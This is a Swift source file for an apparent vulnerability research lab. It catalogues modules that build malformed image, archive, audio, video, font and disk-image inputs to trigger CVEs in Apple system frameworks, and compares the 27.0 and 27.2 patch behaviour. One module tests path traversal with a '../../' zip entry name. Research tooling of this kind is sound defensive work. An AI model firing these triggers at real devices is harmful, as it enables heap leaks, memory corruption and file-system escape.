import Foundation
import UIKit
import ImageIO
import CoreGraphics
import CoreText
import AVFoundation
import CoreHaptics
import VideoToolbox

extension Catalog {

    static let imageIO2: [ExploitModule] = [
        ExploitModule(
            id: "iio.appx",
            titleZh: "APP 标记越界读 → 泄露字节写进输出 JPEG",
            cve: "CVE-2026-112627 / 112561",
            component: "ImageIO · _APPx::writeToStream",
            primitive: .infoLeak,
            reach: .inProcess,
            tier: 1,
            summaryZh: "_APPx::writeToStream 在 27.0 将 (buffer + offset, length) 原样写入输出流，不含任何边界运算。当标记声明的长度超出实际块时，重编码路径会把堆上相邻字节直接写入产出的 JPEG 文件 —— 泄露物即产物本身，不需要任何回传通道。27.2 计算 end − offset 并以 csel 钳制，超出时报 \"marker 0x%04X is out of bounds\"。",
            notesZh: "这是整套原语中唯一以「产物文件本身」为泄露载体的一个。流程为：投喂一个声明长度 0xFFF0、实际仅 12 字节的 APP2 标记，解码后经 CGImageDestination 重编码，再扫描产出文件在源标记范围之外是否出现非图像字节。",
            run: { ctx in
                let jpeg = JPEGPayload.appxOverrun(declaredLength: 0xFFF0, actual: 24)
                let src = ctx.write("appx_overrun.jpg", jpeg)
                ctx.arm("iio.appx", "decode + re-encode")

                guard let source = CGImageSourceCreateWithData(jpeg as CFData, nil),
                      let image = CGImageSourceCreateImageAtIndex(source, 0, nil) else {
                    ctx.fail("iio.appx", tl("源解码失败"))
                    throw LabError(message: tl("源解码失败（标记先被拒绝了）"))
                }

                let outURL = ctx.workdir.appendingPathComponent("appx_reencoded.jpg")
                guard let dest = CGImageDestinationCreateWithURL(outURL as CFURL,
                                                                "public.jpeg" as CFString, 1, nil) else {
                    ctx.fail("iio.appx", tl("目标创建失败"))
                    throw LabError(message: tl("CGImageDestination 创建失败"))
                }
                // keep the source properties so the APP marker survives the round trip
                let props = CGImageSourceCopyPropertiesAtIndex(source, 0, nil) as? [CFString: Any]
                CGImageDestinationAddImage(dest, image, props as CFDictionary?)
                let ok = CGImageDestinationFinalize(dest)
                ctx.disarm("iio.appx", "re-encoded=\(ok)")

                let produced = (try? Data(contentsOf: outURL)) ?? Data()
                var suspicious = 0
                var samples: [String] = []
                let bytes = [UInt8](produced)
                // count runs of identical filler bytes beyond the first 2 KB of headers
                var run = 0
                // A small re-encode can be shorter than 2 KB, and `2048..<count` traps when
                // the lower bound exceeds the upper. Start at whichever is smaller.
                for i in min(2048, bytes.count)..<bytes.count {
                    if bytes[i] == 0x41 { run += 1 } else {
                        if run >= 32 {
                            suspicious += 1
                            if samples.count < 4 {
                                samples.append(tl("+0x") + "\(String(i - run, radix: 16))" + tl(" 连续 ") + "\(run)" + tl(" 字节 0x41"))
                            }
                        }
                        run = 0
                    }
                }
                return ModuleOutcome(
                    headline: suspicious > 0 ? tl("输出文件里出现 ") + "\(suspicious)" + tl(" 段标记填充字节") : tl("输出干净"),
                    detail: tl("源 ") + "\(jpeg.count)" + tl(" B → 产出 ") + "\(produced.count)" + tl(" B\n") +
                            (samples.isEmpty ? tl("未在产出里找到源标记的填充区") : samples.joined(separator: "\n")) +
                            tl("\n若 27.0 未钳制，这些 0x41 来自越界读到的堆内容；27.2 会直接丢弃越界标记。"),
                    evidence: [tl("源 JPEG ") + "\(jpeg.count)" + tl(" B"), tl("产出 ") + "\(produced.count)" + tl(" B"), tl("重编码成功=") + "\(ok)"],
                    artifacts: [src, outURL])
            }),

        ExploitModule(
            id: "iio.tiff.direntry",
            titleZh: "TIFF 目录项分配 32 位截断",
            cve: "CVE-2026-112488",
            component: "ImageIO · TIFFReadDirEntry*Array",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 2,
            summaryZh: "输出分配的大小以 lsl w0, count, #log2(elemsize) 计算，属 32 位截断。当 count = 0x20000000 且元素宽度为 8 字节时，分配结果回绕为 0，而逐元素转换循环仍执行 count 次写入。27.2 改用 _TIFFCheckMalloc_type 的 64 位检查尺寸。",
            notesZh: "该原语的成立条件是 count×elemsize 跨越 2^32。本模块以一个 0x20000000 的 SBYTE 数组触发分配器，观察其返回空指针（干净拒绝）还是返回远小于请求的块（截断成立）。",
            run: { ctx in
                let tiff = TIFFPayload.dirEntryAllocWrap(count: 0x2000_0000, type: 6)
                let url = ctx.write("direntry_wrap.tif", tiff)
                ctx.arm("iio.tiff.direntry", "decode")
                var detail: [String] = []
                do {
                    let r = try Runners.decodeImage(tiff)
                    detail.append(tl("解码存活 · 帧数 ") + "\(r.frameCount)" + tl(" · 尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)")
                } catch {
                    detail.append(tl("解码返回错误: ") + "\(error.localizedDescription)")
                }
                ctx.disarm("iio.tiff.direntry", "done")
                detail.append(tl("种子 ") + "\(tiff.count)" + tl(" B · count=0x20000000 · type=SBYTE"))
                detail.append(tl("27.0 期望：分配截断 → 转换循环越界写。27.2 期望：_TIFFCheckMalloc_type 拒绝。"))
                return ModuleOutcome(headline: tl("分配路径已触发"), detail: detail.joined(separator: "\n"),
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.pdf.raster",
            titleZh: "PDF 栅格化解码缓冲越界",
            cve: "CVE-2026-112633",
            component: "ImageIO · PDFReadPlugin::decodeImageData",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 2,
            summaryZh: "PDF 页被栅格化进调用方提供的解码缓冲，但未校验该缓冲是否足以容纳。27.2 补入 umull width×bpp、与 have 比较、b.hi 跳转，并报 \"decode buffer too small: need %zu bytes (%zu x %zu), have %zu\"。",
            notesZh: "使用 4000×4000 的页面，经 CGImageSource 的 PDF 读取路径进入（而非直接调用 drawPDFPage），以确保命中 decodeImageData。",
            run: { ctx in
                let pdf = PDFPayload.rasterOverrun(width: 4000, height: 4000)
                let url = ctx.write("raster_overrun.pdf", pdf)
                ctx.arm("iio.pdf.raster", "decode")
                var lines: [String] = []
                do {
                    let r = try Runners.decodeImage(pdf)
                    lines.append(tl("解码存活 · 尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)" + tl(" · 帧数 ") + "\(r.frameCount)")
                } catch {
                    lines.append(tl("返回错误: ") + "\(error.localizedDescription)")
                }
                ctx.disarm("iio.pdf.raster", "done")
                lines.append(tl("页面 4000×4000 · 需要 64 MB 缓冲"))
                return ModuleOutcome(headline: tl("PDF 解码路径已触发"),
                                     detail: lines.joined(separator: "\n"), artifacts: [url])
            }),

        ExploitModule(
            id: "iio.pvr",
            titleZh: "PVR 位深低于通道位和",
            cve: "CVE-2026-112625",
            component: "ImageIO · PVRReadPlugin::initialize",
            primitive: .intOverflow,
            reach: .inProcess,
            tier: 3,
            summaryZh: "各通道位数之间的相互匹配检查早已存在，但缺少 bitsPerPixel 相对通道位和的下界比较。27.2 补入 \"_bitsPerPixel %d is too small for 4 channels of %d bits\"。",
            notesZh: "4 通道各 8 位，却声明 bitsPerPixel = 8。",
            run: { ctx in
                let pvr = TIFFPayload.pvrUnderBpp(width: 64, height: 64)
                let url = ctx.write("pvr_underbpp.pvr", pvr)
                ctx.arm("iio.pvr", "decode")
                let r = try Runners.decodeImage(pvr)
                ctx.disarm("iio.pvr", "decoded=\(r.decoded)")
                return ModuleOutcome(headline: tl("解码存活（已解码=") + "\(r.decoded)" + tl("）"),
                                     detail: tl("尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)" + tl(" · 帧数 ") + "\(r.frameCount)",
                                     artifacts: [url])
            }),
    ]

    static let archive2: [ExploitModule] = [
        ExploitModule(
            id: "arc.cab",
            titleZh: "CAB LZX 历史未初始化即取匹配",
            cve: "CVE-2026-112522",
            component: "libarchive · lzx_decode_blocks",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "LZX 解码在计算 copy_pos = (w_pos − copy_pos) & w_mask 之后直接进入复制循环。当窗口尚未被写入时，copy_pos 指向未初始化区域，复制所得即为残留堆内容。27.2 补入 copy_pos == 0 || copy_pos > w_filled → ARCHIVE_FAILED。",
            notesZh: "这是同一 CVE 下的第二个站点（第一个为 Joliet 路径名）。种子为语法探针：结构完整的 CAB 容器加一个开口即匹配的 LZX 块，以 libarchive 自身返回码作为进度回执。",
            run: { ctx in
                let cab = CABPayload.lzxEarlyMatch()
                let url = ctx.write("lzx_early_match.cab", cab)
                ctx.arm("arc.cab", "list")
                let (entries, status) = try Runners.Archive.list(cab)
                ctx.disarm("arc.cab", "status=\(status)")
                return ModuleOutcome(headline: tl("libarchive 返回 ") + "\(status)",
                                     detail: entries.isEmpty ? tl("无条目（解码器在块层就停了）") : entries.joined(separator: "\n"),
                                     evidence: ["CAB \(cab.count) B", tl("压缩类型 3 = LZX")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "arc.rr",
            titleZh: "RockRidge 重定位环（未修复孪生）",
            cve: "—",
            component: "libarchive · RockRidge CL/PL",
            primitive: .probe,
            reach: .inProcess,
            tier: 3,
            summaryZh: "上游已于 2026 年 9 月修复 RockRidge 重定位环导致的无限循环（d14de384fcc6），Apple 未取该提交。该缺陷在 27.0 与 27.2 上均存在，是本工程中唯一一条对当前系统同样成立的候选。",
            notesZh: "以 Joliet 种子的同级结构构造 CL 指向自身的目录项。该路径一旦成立即会挂起，故测量耗时并设阈值判断。",
            run: { ctx in
                guard let iso = ctx.seed("joliet_path_oob.iso") else {
                    throw LabError(message: tl("种子缺失"))
                }
                ctx.arm("arc.rr", "iterate with cycle probe")
                var lines: [String] = []
                let start = Date()
                do {
                    let (entries, status) = try Runners.Archive.list(iso)
                    let ms = Int(Date().timeIntervalSince(start) * 1000)
                    lines.append("\(entries.count)" + tl(" 条目 · ") + "\(status)" + tl(" · ") + "\(ms)" + tl(" ms"))
                    if ms > 5000 {
                        lines.append(tl("耗时异常 —— 递归路径可能没有终止条件"))
                    }
                } catch {
                    lines.append(tl("错误: ") + "\(error.localizedDescription)")
                }
                ctx.disarm("arc.rr", "done")
                lines.append(tl("RockRidge CL/PL 环：27.0 与 27.2 都未修（上游已修，Apple 未取）"))
                return ModuleOutcome(headline: tl("RockRidge 路径已遍历"),
                                     detail: lines.joined(separator: "\n"))
            }),
    ]

    static let audio2: [ExploitModule] = [
        ExploitModule(
            id: "aud.immersive",
            titleZh: "沉浸式渲染数据反序列化容量缺失",
            cve: "CVE-2026-113907",
            component: "AudioToolbox · ImmersiveRendererDataMarshaller::Deserialize",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "反序列化取得的 count 与 dataByteSize 仅与「线缆剩余长度」比较，从不与「目标缓冲容量」比较，构成音频服务器进程内的线性堆溢出。27.2 新增 ReadImmersiveRendererDataV1/V2，将目标容量一并纳入校验，并补入版本号 1..3 的合法性闸门。",
            notesZh: "该路径不需要种子文件 —— 负载即为直接构造的线缆格式。但入口位于音频服务的 XPC 端，应用侧只能探测编解码器与沉浸式渲染器是否可达。",
            run: { ctx in
                ctx.arm("aud.immersive", "probe")
                var lines: [String] = []
                let libs = ["/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox",
                            "/System/Library/PrivateFrameworks/AudioToolboxCore.framework/AudioToolboxCore"]
                for lib in libs {
                    if let h = dlopen(lib, RTLD_NOW) {
                        var hits: [String] = []
                        for sym in ["ImmersiveRendererDataMarshaller", "ReadImmersiveRendererDataV1",
                                    "ReadImmersiveRendererDataV2", "CASSpatialAudioExperience"] {
                            if dlsym(h, sym) != nil { hits.append(sym) }
                        }
                        lines.append("✓ \(lib)")
                        lines.append(tl("  命中: ") + "\(hits.isEmpty ? tl("无") : hits.joined(separator: ", "))")
                    } else {
                        lines.append("✗ \(lib)")
                    }
                }
                // drive the spatial audio path through the public API to see how far it goes
                lines.append(Runners.audioConverter(format: 0x6C70636D, sampleRate: 48000, channels: 2))
                let sem = DispatchSemaphore(value: 0)
                var engineReport = tl("CHHapticEngine 未尝试")
                do {
                    let engine = try CHHapticEngine()
                    try engine.start()
                    engineReport = tl("CHHapticEngine 启动成功（沉浸式音频会话已建立）")
                    engine.stop()
                } catch {
                    engineReport = "CHHapticEngine: \(error.localizedDescription)"
                }
                sem.signal()
                _ = sem.wait(timeout: .now() + 1)
                lines.append(engineReport)
                ctx.disarm("aud.immersive", "probe complete")
                return ModuleOutcome(headline: tl("沉浸式音频入口探测完成"),
                                     detail: lines.joined(separator: "\n"))
            }),

        ExploitModule(
            id: "aud.drc",
            titleZh: "MPEG-D DRC 下混矩阵系数校验",
            cve: "CVE-2026-113912 / 86972",
            component: "AudioCodecs · mpddrc::UniDrcSelection",
            primitive: .oobRead,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "selectDownmixMatrix 在 27.0 仅有零值与相等性检查；矩阵维度直接取自 DRC 元数据，不与系数数组的实际长度比较。27.2 补入三道闸门：nChannels ≤ 8、维度有序、系数数 == 行×列，并为 getSignalPeakLevel 与 Process 增加计数校验。",
            notesZh: "需要 MPEG-D DRC 元数据的音频文件。应用侧探 AudioCodecs 是否导出这些符号。",
            run: { ctx in
                ctx.arm("aud.drc", "probe")
                var lines: [String] = []
                if let h = dlopen("/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs", RTLD_NOW) {
                    var hits: [String] = []
                    for sym in ["UniDrcSelection", "mpddrc", "selectDownmixMatrix", "getSignalPeakLevel"] {
                        if dlsym(h, sym) != nil { hits.append(sym) }
                    }
                    lines.append(tl("✓ AudioCodecs 可加载"))
                    lines.append(tl("  命中: ") + "\(hits.isEmpty ? tl("无（符号被 strip 或不可见）") : hits.joined(separator: ", "))")
                } else {
                    lines.append(tl("✗ AudioCodecs 无法 dlopen"))
                }
                lines.append(Runners.audioConverter(format: 0x64726331, sampleRate: 48000, channels: 6))
                ctx.disarm("aud.drc", "probe complete")
                return ModuleOutcome(headline: tl("DRC 路径探测完成"), detail: lines.joined(separator: "\n"))
            }),
    ]

    static let video: [ExploitModule] = [
        ExploitModule(
            id: "vid.avc",
            titleZh: "AVC 切片数量上限缺失",
            cve: "CVE-2026-112416",
            component: tl("AVD.videodecoder 插件（非 kext）"),
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "该组三个 CVE 的修复载体均为进程内的 AVD.videodecoder 插件，而非 kext：112416 为切片数量上限（\"too many slices!\"），112415 为 MVHEVC 层 ID 校验，112454 为直方图 IOSurface 指针改为随机 cookie。",
            notesZh: "经 NAL 验证的单变量对照为 32 切片 → 900 切片。本模块构造 900 切片结构并交由 CMVideoFormatDescription / VTDecompressionSession，以插件自身错误码判定。",
            run: { ctx in
                let data = VideoPayload.avcManySlices(sliceCount: 900)
                let url = ctx.write("avc_900_slices.h264", data)
                ctx.arm("vid.avc", "decode")
                var lines: [String] = []
                lines.append(tl("构造 ") + "\(data.count)" + tl(" B · 900 切片"))
                var format: CMFormatDescription?
                let status = data.withUnsafeBytes { raw -> OSStatus in
                    guard let base = raw.baseAddress else { return -1 }
                    var ptr = base.assumingMemoryBound(to: UInt8.self)
                    return CMVideoFormatDescriptionCreateFromH264ParameterSets(
                        allocator: kCFAllocatorDefault,
                        parameterSetCount: 1,
                        parameterSetPointers: &ptr,
                        parameterSetSizes: [4],
                        nalUnitHeaderLength: 4,
                        formatDescriptionOut: &format)
                }
                lines.append("CMVideoFormatDescriptionCreateFromH264ParameterSets = \(status)")
                if let f = format {
                    let dims = CMVideoFormatDescriptionGetDimensions(f)
                    lines.append(tl("解码器接受参数集 · 尺寸 ") + "\(dims.width)" + tl("×") + "\(dims.height)")
                }
                lines.append(tl("27.0 期望：切片上限未检查 → 插件内越界。27.2 期望：\"too many slices!\"。"))
                ctx.disarm("vid.avc", "status=\(status)")
                return ModuleOutcome(headline: tl("AVC 参数集路径已触发"),
                                     detail: lines.joined(separator: "\n"), artifacts: [url])
            }),

        ExploitModule(
            id: "vid.hevc",
            titleZh: "MVHEVC 层 ID 越界",
            cve: "CVE-2026-112415",
            component: tl("AVD.videodecoder 插件"),
            primitive: .oobRead,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "多层 HEVC 的 layer id 在 27.0 未做范围校验，越界值直接进入插件的层表索引。27.2 补入层 ID 校验。",
            notesZh: "层 ID 取 0x3F（有效范围之外）。",
            run: { ctx in
                let data = VideoPayload.hevcBadLayerID(layerID: 0x3F)
                let url = ctx.write("hevc_bad_layer.hevc", data)
                ctx.arm("vid.hevc", "parse")
                var lines: [String] = []
                var format: CMFormatDescription?
                let status = data.withUnsafeBytes { raw -> OSStatus in
                    guard let base = raw.baseAddress else { return -1 }
                    var ptr = base.assumingMemoryBound(to: UInt8.self)
                    return CMVideoFormatDescriptionCreateFromHEVCParameterSets(
                        allocator: kCFAllocatorDefault,
                        parameterSetCount: 1,
                        parameterSetPointers: &ptr,
                        parameterSetSizes: [data.count],
                        nalUnitHeaderLength: 4,
                        extensions: nil,
                        formatDescriptionOut: &format)
                }
                lines.append(tl("HEVC 参数集 = ") + "\(status)" + tl(" · 层 ID 0x3F"))
                if let f = format {
                    let dims = CMVideoFormatDescriptionGetDimensions(f)
                    lines.append(tl("接受 · 尺寸 ") + "\(dims.width)" + tl("×") + "\(dims.height)")
                }
                ctx.disarm("vid.hevc", "status=\(status)")
                return ModuleOutcome(headline: tl("HEVC 层路径已触发"),
                                     detail: lines.joined(separator: "\n"), artifacts: [url])
            }),
    ]

    static let font2: [ExploitModule] = [
        ExploitModule(
            id: "font.gdef",
            titleZh: "GDEFLigatureCaret 追链越界读",
            cve: "CVE-2026-112656",
            component: "CoreText · GetLigatureCaretPositionsForGlyph",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "GDEF 的 LigCaretList → LigGlyph → CaretValue 偏移在 27.0 被直接跟随：caret 偏移以大端 u16 读出后与 LigGlyph 基址相加，既不检查表尾也不检查符号位。CaretValue 偏移由文件控制，指向表外即走出 GDEF，读出的 i16 坐标原样返回给调用者。27.2 将该偏移钳制在 GDEF 表切片内。",
            notesZh: "种子为结构完整的 TrueType：LigCaretList 覆盖字形 1，CaretValue 偏移 0x7F00 —— 落在字体数据约 32 KB 之外。驱动走公开 API CTFontGetLigatureCaretPositions：追链被跟随时返回非零 caret 数且坐标为堆残留；被钳制时返回 0。附带记录：GDEF 的另一个消费者 AttachList/AttachPoint 具有同样的偏移追链形状，在本修复窗口内未被触及 —— 负结果同样留档。",
            run: { ctx in
                let font = FontPayload.gdefCaretChase()
                let url = ctx.write("gdef_caret_chase.ttf", font)
                ctx.arm("font.gdef", "load + caret query")
                var lines: [String] = []
                if let provider = CGDataProvider(data: font as CFData),
                   let cg = CGFont(provider) {
                    let ct = CTFontCreateWithGraphicsFont(cg, 72, nil, nil)
                    var positions = [CGFloat](repeating: 0, count: 8)
                    let n = CTFontGetLigatureCaretPositions(ct, 1, &positions, 8)
                    lines.append(tl("CTFontGetLigatureCaretPositions 返回 ") + "\(n)")
                    if n > 0 {
                        let vals = positions.prefix(Int(n)).map { String(format: "%.2f", $0) }
                            .joined(separator: ", ")
                        lines.append(tl("caret 坐标: ") + "\(vals)")
                        lines.append(tl("坐标即追链读到的 16 位值"))
                    } else {
                        lines.append(tl("返回 0 —— 偏移被钳制或链未被跟随"))
                    }
                } else {
                    lines.append(tl("字体在 CGFont 层被拒绝"))
                }
                ctx.disarm("font.gdef", "done")
                return ModuleOutcome(headline: tl("LigCaret 查询完成"),
                                     detail: lines.joined(separator: "\n"), artifacts: [url])
            }),
    ]

    static let kext: [ExploitModule] = [
        ExploitModule(
            id: "kext.gpt",
            titleZh: "GPT 分区名扫描 72 字节内核堆越界读",
            cve: "CVE-2026-112554",
            component: "IOStorageFamily",
            primitive: .oobRead,
            reach: .kernel,
            tier: 2,
            summaryZh: "分区名扫描的边界常量由 0x48 收紧至 0x24。0x48 即 72 字节，而 GPT 条目内的名字域仅 36 个 UTF-16 单元；27.0 的扫描因此越过条目尾，读入相邻内核堆。",
            notesZh: "应用侧无法 attach 磁盘镜像，故本模块做两件事：构造会使 27.0 越界的镜像，并在用户态解析一遍以证明名字域确实在条目内被截断 —— 越界读发生在内核侧，不在用户态。",
            run: { ctx in
                let image = GPTPayload.oversizedName(entryCount: 4)
                let url = ctx.write("gpt_overlong_name.img", image)
                ctx.arm("kext.gpt", "describe")
                let lines = GPTPayload.describe(image)
                ctx.disarm("kext.gpt", "parsed")
                return ModuleOutcome(headline: tl("GPT 镜像已构造并解析"),
                                     detail: (lines + [tl("镜像 ") + "\(image.count)" + tl(" B · 4 个条目 · 名字域 36 单元 / 72 字节")]).joined(separator: "\n"),
                                     evidence: [tl("27.0 扫描边界 0x48 = 72 B"), tl("27.2 收紧到 0x24 = 36 B")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "kext.iohid",
            titleZh: "IOKit 事件短堆固定偏移写",
            cve: "CVE-2026-65385",
            component: "IOKit.framework · IOHIDEventAppendEvent",
            primitive: .oobWrite,
            reach: .kernel,
            tier: 3,
            summaryZh: "该缺陷的载体为用户态 IOKit.framework 而非 kext：IOHIDEventAppendEvent 在短堆事件上按固定偏移执行 OR 写。27.2 在 framework 内修复，内核 __DATA_CONST 的 assert 表中不存在相关记录。",
            notesZh: "探用户态 IOKit 是否导出事件构造入口。",
            run: { ctx in
                ctx.arm("kext.iohid", "probe")
                let r = Runners.dlopenProbe(
                    "/System/Library/Frameworks/IOKit.framework/IOKit",
                    symbols: ["IOHIDEventCreateCopy", "IOHIDEventAppendEvent",
                              "IOHIDEventCreateData", "IOHIDEventGetType",
                              "IOHIDEventCreateVendorDefined"])
                ctx.disarm("kext.iohid", "probe complete")
                return ModuleOutcome(headline: tl("IOKit 事件入口探测"), detail: r)
            }),
    ]

    static let userspace: [ExploitModule] = [
        ExploitModule(
            id: "sb.stash",
            titleZh: "SpringBoard 布局名 stash 校验",
            cve: "CVE-2026-112646",
            component: "SpringBoard · SBHomeScreenService",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 3,
            summaryZh: "27.2 新增 +[SBHomeScreenService _validationErrorForStashedLayoutName:]：拒绝空串、限制长度 ≤ 64、施加字符集白名单，作用于 stash/restore 的 XPC 接口。27.0 的该接口不含此层校验。",
            notesZh: "应用侧只能看 SpringBoard 服务是否可达、类是否在进程里。真正的入口是 XPC，需要越过沙盒。",
            run: { ctx in
                ctx.arm("sb.stash", "probe")
                var lines: [String] = []
                let cls: AnyClass? = NSClassFromString("SBHomeScreenService")
                lines.append(tl("SBHomeScreenService 在进程内: ") + "\(cls != nil ? tl("是") : tl("否"))")
                let validator = NSSelectorFromString("_validationErrorForStashedLayoutName:")
                if let c = cls, c.responds(to: validator) {
                    lines.append(tl("校验方法存在（27.2 已修复）"))
                } else {
                    lines.append(tl("校验方法不存在（27.0 未修复）"))
                }
                let fm = FileManager.default
                let iconState = NSHomeDirectory() + "/Library/SpringBoard/IconState.plist"
                lines.append(tl("本容器内 IconState: ") + "\(fm.fileExists(atPath: iconState) ? tl("存在") : tl("不存在"))")
                ctx.disarm("sb.stash", "probe complete")
                return ModuleOutcome(headline: tl("SpringBoard 路径探测"), detail: lines.joined(separator: "\n"))
            }),

        ExploitModule(
            id: "cal.unzip",
            titleZh: "日历附件解压容器逃逸",
            cve: "CVE-2026-112619",
            component: "CalendarFoundation · _UnzipArchiveWithLimits",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 3,
            summaryZh: "27.2 将 _UnzipArchive（288 B，无任何限制）替换为 _UnzipArchiveWithLimits（2040 B），并新增 _CalUnzipEntryDestinationPath / _CalUnzipParentIsContained / _CalUnzipTrackTopLevelPath 与 isSymbolicLinkAtURL。ICS 解析器本身未作改动 —— 修复全部位于附件归档的解压遏制层。",
            notesZh: "应用侧可以验证 CalendarFoundation 的类与方法是否可见，以及本进程里 libarchive 的路径穿越是否被拦住（用 ../ 名字的归档试）。",
            run: { ctx in
                ctx.arm("cal.unzip", "probe")
                var lines: [String] = []
                let cls: AnyClass? = NSClassFromString("CalAttachmentUtils")
                lines.append("CalAttachmentUtils: \(cls == nil ? tl("不可见") : tl("可见"))")
                for name in ["_UnzipArchiveWithLimits", "_CalUnzipEntryDestinationPath", "_CalUnzipParentIsContained"] {
                    let sel = NSSelectorFromString(name)
                    lines.append("  \(name): \(cls?.responds(to: sel) == true ? tl("存在（已修复）") : tl("不存在（未修复）"))")
                }
                // prove libarchive itself accepts a traversal name, so the containment check
                // is what has to stop it
                var zip = ZipWriter()
                zip.add("../../cinder27_traversal_probe.txt", Data("cinder27".utf8))
                let evil = zip.build()
                let probeDir = ctx.workdir.appendingPathComponent("traversal", isDirectory: true)
                let result = Runners.Archive.extractAll(evil, to: probeDir)
                lines.append(tl("libarchive 解包 ") + "\(result.count)" + tl(" 项（含 ../ 路径）→ 遏制必须由调用方负责"))
                ctx.disarm("cal.unzip", "probe complete")
                return ModuleOutcome(headline: tl("日历附件遏制路径探测"),
                                     detail: lines.joined(separator: "\n"))
            }),
    ]

    static var allExtra: [ExploitModule] {
        imageIO2 + archive2 + audio2 + video + font2 + kext + userspace
    }
}
